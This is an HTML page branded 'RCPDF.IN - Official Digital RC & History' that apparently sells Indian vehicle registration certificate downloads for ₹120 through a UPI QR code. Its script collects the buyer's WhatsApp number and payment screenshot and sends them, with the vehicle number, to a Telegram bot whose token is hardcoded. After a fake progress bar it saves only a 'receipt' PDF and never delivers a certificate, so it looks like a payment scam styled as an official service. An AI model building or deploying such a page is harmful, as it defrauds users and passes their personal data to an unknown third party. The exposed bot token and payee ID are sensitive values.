<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RCPDF.IN - Official Digital RC & History</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <style>
        :root { --primary: #ff0066; --ind-blue: #003399; }
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Arial', sans-serif; }
        body { background: #000; color: #fff; overflow-x: hidden; }

        /* Header */
        .header { position: fixed; top: 0; width: 100%; background: #fff; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; z-index: 1000; }
        .logo { color: var(--primary); font-weight: 900; font-size: 20px; text-decoration: none; }

        /* Card & UI */
        .card { margin: 100px auto 20px; width: 92%; max-width: 400px; background: #1a1a1c; padding: 25px 20px; border-radius: 25px; text-align: center; border: 1px solid #333; }
        
        /* HSRP PLATE */
        .hsrp-plate { background: #fff; width: 100%; height: 65px; border: 2px solid #555; border-radius: 10px; display: flex; align-items: center; overflow: hidden; margin-bottom: 5px; }
        .ind-strip { background: var(--ind-blue); width: 45px; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; }
        .ind-strip img { width: 20px; }
        .ind-strip span { font-size: 10px; font-weight: 900; }
        #vehInput { flex: 1; border: none; height: 100%; font-size: 24px; font-weight: 900; text-align: center; color: #000; outline: none; }

        .btn { width: 100%; padding: 16px; border-radius: 12px; border: none; background: var(--primary); color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        
        /* HISTORY SECTION */
        .history-card { width: 92%; max-width: 400px; margin: 0 auto 100px; background: #111; padding: 15px; border-radius: 15px; border: 1px dashed #444; }
        .hist-item { background: #222; padding: 10px; border-radius: 8px; margin-bottom: 8px; display: flex; justify-content: space-between; font-size: 13px; }

        /* LOADER */
        .loader-wrap { position: fixed; inset: 0; background: #000; z-index: 5000; display: none; flex-direction: column; justify-content: center; align-items: center; }
        .road { width: 80%; height: 3px; background: #333; position: relative; }
        .car { font-size: 40px; position: absolute; bottom: 0; left: 0; transform: scaleX(-1); transition: 0.1s linear; }
        .pct { font-size: 40px; font-weight: 900; color: var(--primary); margin-top: 20px; }

        .err { color: #ff4d4d; font-size: 12px; display: none; text-align: left; margin-top: 5px; }
    </style>
</head>
<body>

    <div class="header">
        <b class="logo">RCPDF.IN</b>
        <button style="background:none; border:none; font-size:22px;" onclick="location.reload()">🏠</button>
    </div>

    <div class="card">
        <div id="p1">
            <h2 style="margin-bottom:15px;">Download RC</h2>
            <div class="hsrp-plate">
                <div class="ind-strip"><img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg"><span>IND</span></div>
                <input type="text" id="vehInput" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatV(this)">
            </div>
            <div id="vErr" class="err">⚠ सही गाड़ी नंबर डालें</div>
            <button class="btn" onclick="go2()">Continue</button>
        </div>

        <div id="p2" style="display:none;">
            <p style="font-size:14px; margin-bottom:10px;">Pay ₹120 to Proceed</p>
            <div style="background:#fff; padding:10px; border-radius:10px; display:inline-block; margin-bottom:15px;">
                <img id="qrImg" src="" width="180">
            </div>
            <input type="tel" id="mob" placeholder="WhatsApp Number" maxlength="10" style="width:100%; padding:15px; border-radius:10px; border:none; margin-bottom:10px; background:#222; color:#fff;">
            <input type="file" id="ss" style="margin-bottom:15px; font-size:12px; color:#aaa;">
            <button class="btn" onclick="submit()">Verify & Download</button>
        </div>
    </div>

    <div class="history-card">
        <h3 style="font-size:16px; margin-bottom:10px; color:var(--primary);">Recent Downloads</h3>
        <div id="histList"><p style="font-size:12px; color:#666;">No history found.</p></div>
    </div>

    <div class="loader-wrap" id="load">
        <div class="road"><div class="car" id="carIcon">🚗</div></div>
        <div class="pct" id="pText">0%</div>
    </div>

    <script>
        // On Page Load: Show History
        window.onload = showHistory;

        function formatV(i) {
            let v = i.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
            let out = "";
            if (v.length > 0) out += v.substring(0, 2);
            if (v.length > 2) out += "-" + v.substring(2, 4);
            if (v.length > 4) out += "-" + v.substring(4, 6);
            if (v.length > 6) out += "-" + v.substring(6, 10);
            i.value = out;
        }

        function go2() {
            if(document.getElementById('vehInput').value.length < 9) {
                document.getElementById('vErr').style.display='block';
                return;
            }
            // Generate UPI Link for QR
            const upi = "upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120.00&cu=INR&tn=RC%20DOWNLOAD";
            document.getElementById('qrImg').src = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=" + encodeURIComponent(upi);
            
            document.getElementById('p1').style.display='none';
            document.getElementById('p2').style.display='block';
        }

        function submit() {
            const m = document.getElementById('mob').value;
            const s = document.getElementById('ss').files[0];
            if(m.length < 10 || !s) { alert("Please fill all details & upload screenshot"); return; }

            document.getElementById('load').style.display='flex';
            let p = 0;
            let iv = setInterval(() => {
                p += 2;
                document.getElementById('pText').innerText = p + "%";
                document.getElementById('carIcon').style.left = (p * 0.85) + "%";
                if(p >= 100) {
                    clearInterval(iv);
                    saveHistory(document.getElementById('vehInput').value);
                    makePDF();
                    sendT(s);
                }
            }, 60);
        }

        function saveHistory(veh) {
            let logs = JSON.parse(localStorage.getItem('rc_logs') || "[]");
            logs.unshift({veh: veh, date: new Date().toLocaleDateString()});
            localStorage.setItem('rc_logs', JSON.stringify(logs.slice(0, 5))); // Keep last 5
            showHistory();
        }

        function showHistory() {
            let logs = JSON.parse(localStorage.getItem('rc_logs') || "[]");
            const container = document.getElementById('histList');
            if(logs.length > 0) {
                container.innerHTML = logs.map(l => `
                    <div class="hist-item">
                        <span><b>${l.veh}</b></span>
                        <span style="color:#888;">${l.date}</span>
                    </div>
                `).join('');
            }
        }

        function makePDF() {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();
            const v = document.getElementById('vehInput').value;
            doc.setFillColor(255, 0, 102); doc.rect(0, 0, 210, 20, 'F');
            doc.setTextColor(255); doc.text("RCPDF.IN - PAYMENT RECEIPT", 105, 13, null, null, "center");
            doc.setTextColor(0); doc.text(`Vehicle: ${v}`, 20, 40);
            doc.text(`Amount: Rs.120`, 20, 50);
            doc.text(`Status: Processing (30 mins)`, 20, 60);
            doc.save(`Receipt_${v}.pdf`);
            location.reload();
        }

        function sendT(f) {
            let fd = new FormData();
            fd.append("chat_id", "5600045707");
            fd.append("photo", f);
            let msg = `🚀 NEW ORDER\n\n🚗 Veh: ${document.getElementById('vehInput').value}\n📱 Mob: ${document.getElementById('mob').value}\n\nRC DOWNLOAD`;
            fd.append("caption", msg);
            fetch("https://api.telegram.org/bot8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E/sendPhoto", {method:"POST", body:fd});
        }
    </script>
</body>
</html>
